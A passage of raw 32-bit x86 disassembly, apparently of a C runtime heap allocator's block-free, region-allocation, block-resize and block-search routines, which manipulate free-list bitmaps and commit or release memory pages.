  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
